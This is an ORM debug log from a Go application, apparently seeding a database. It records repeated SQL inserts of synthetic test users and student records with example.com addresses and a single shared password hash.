[0m[33m[10.327ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:52.012','2025-06-09 14:07:52.012',NULL,'loouzuegww','DmSAtzh','sWcWyon','vISaQ','student10@example.com','+200000009','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.522ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 67 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[6.556ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:52.021','2025-06-09 14:07:52.021',NULL,false,67) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[6.618ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:52.028','2025-06-09 14:07:52.028',NULL,'ipnprflvwq','Xbuyaop','EEGDhTz','lHLPW','student11@example.com','+200000010','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.105ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 68 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[7.563ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:52.035','2025-06-09 14:07:52.035',NULL,false,68) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[7.422ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:52.042','2025-06-09 14:07:52.042',NULL,'gxnqosqzvs','MGdGSya','WVvNeId','CXIKc','student12@example.com','+200000011','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.574ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 69 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[12.201ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:52.05','2025-06-09 14:07:52.05',NULL,false,69) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[6.588ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:52.062','2025-06-09 14:07:52.062',NULL,'hgdlwerill','eHoeSkA','lQvqrDx','dkPnL','student13@example.com','+200000012','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.540ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 70 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[6.779ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:52.069','2025-06-09 14:07:52.069',NULL,false,70) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[9.416ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:52.077','2025-06-09 14:07:52.077',NULL,'vpuszeywna','tHUFDuC','guNJICC','zBeSt','student14@example.com','+200000013','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.560ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 71 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[12.046ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:52.086','2025-06-09 14:07:52.086',NULL,false,71) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[6.561ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:52.097','2025-06-09 14:07:52.097',NULL,'kcvboiosgf','yoSEDPV','XfLNemh','ixfnT','student15@example.com','+200000014','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.606ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 72 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[12.799ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:52.105','2025-06-09 14:07:52.105',NULL,false,72) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[6.341ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:52.12','2025-06-09 14:07:52.12',NULL,'jmyarhmlaa','oLjtFGX','kLSKeyR','QwlJl','student16@example.com','+200000015','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.585ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 73 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[8.452ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:52.127','2025-06-09 14:07:52.127',NULL,false,73) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[5.588ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:52.135','2025-06-09 14:07:52.135',NULL,'efuinigwkk','QiIVPGF','dgnBsQt','zAYYo','student17@example.com','+200000016','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.544ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 74 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[6.102ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:52.141','2025-06-09 14:07:52.141',NULL,false,74) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[5.690ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:52.147','2025-06-09 14:07:52.147',NULL,'jjrylewhle','vrjHGsF','aobkgyU','gFWUx','student18@example.com','+200000017','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.526ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 75 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[6.203ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:52.153','2025-06-09 14:07:52.153',NULL,false,75) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[6.375ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:52.16','2025-06-09 14:07:52.16',NULL,'wmsgaljqfm','eTiCjpr','CHrwAKE','XtVTr','student19@example.com','+200000018','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.444ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 76 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[6.096ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:52.166','2025-06-09 14:07:52.166',NULL,false,76) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[6.890ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:52.172','2025-06-09 14:07:52.172',NULL,'bhrsuvkwsm','sieECKW','TkYXKMl','ZHWjP','student20@example.com','+200000019','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.480ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 77 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[8.582ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:52.179','2025-06-09 14:07:52.179',NULL,false,77) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[5.561ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:52.188','2025-06-09 14:07:52.188',NULL,'qejbmhuocp','xVgdaAG','GrKyUzg','dFWMd','student21@example.com','+200000020','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.392ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 78 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[7.074ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:52.195','2025-06-09 14:07:52.195',NULL,false,78) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[7.865ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:52.201','2025-06-09 14:07:52.201',NULL,'wnetinuvwm','DOyWULc','jleCMhE','zXWct','student22@example.com','+200000021','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.523ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 79 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[7.902ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:52.211','2025-06-09 14:07:52.211',NULL,false,79) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[5.742ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:52.217','2025-06-09 14:07:52.217',NULL,'bvxhhzaynw','cAFdtuU','JGEUZWH','TfzHa','student23@example.com','+200000022','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.472ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 80 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[6.241ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:52.223','2025-06-09 14:07:52.223',NULL,false,80) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[5.662ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:52.229','2025-06-09 14:07:52.229',NULL,'vjstjgvuke','bytupsg','fszgNDE','PhFop','student24@example.com','+200000023','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.499ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 81 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[9.499ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:52.235','2025-06-09 14:07:52.235',NULL,false,81) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[5.714ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:52.244','2025-06-09 14:07:52.244',NULL,'bmtjhhffhg','owenkeh','YiznIfD','Nxjuj','student25@example.com','+200000024','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[3.559ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 82 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[9.238ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:52.254','2025-06-09 14:07:52.254',NULL,false,82) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[5.814ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:52.26','2025-06-09 14:07:52.26',NULL,'ngyxfpiyld','AeETewt','rdIXAUU','XHDcu','student26@example.com','+200000025','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.500ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 83 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[6.137ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:52.266','2025-06-09 14:07:52.266',NULL,false,83) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[5.629ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:52.272','2025-06-09 14:07:52.272',NULL,'kdjcqazjpe','coYaEFG','rEtEHFv','ltuMf','student27@example.com','+200000026','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.558ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 84 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[8.586ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:52.281','2025-06-09 14:07:52.281',NULL,false,84) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[5.661ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:52.286','2025-06-09 14:07:52.286',NULL,'deacizqznu','FPuNLOS','vgYFpMG','keDZX','student28@example.com','+200000027','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.524ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 85 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[6.201ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:52.293','2025-06-09 14:07:52.293',NULL,false,85) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[5.688ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:52.299','2025-06-09 14:07:52.299',NULL,'vccisltqaq','MTtOTeb','WwWGSTK','oMHoN','student29@example.com','+200000028','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.504ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 86 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[6.136ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:52.305','2025-06-09 14:07:52.305',NULL,false,86) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[5.757ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:52.311','2025-06-09 14:07:52.311',NULL,'iooskvbwmu','khPGbzp','pZMlaAz','qUlsi','student30@example.com','+200000029','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.504ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 87 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[6.437ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:52.317','2025-06-09 14:07:52.317',NULL,false,87) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[6.263ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:52.324','2025-06-09 14:07:52.324',NULL,'knvyfkalkc','AuWnyEY','qyxplUL','fpiKo','student31@example.com','+200000030','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.501ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 88 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[14.215ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:52.33','2025-06-09 14:07:52.33',NULL,false,88) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[5.446ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:52.344','2025-06-09 14:07:52.344',NULL,'siogvrhcwh','mqdARHD','oBNccOj','vDlWa','student32@example.com','+200000031','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
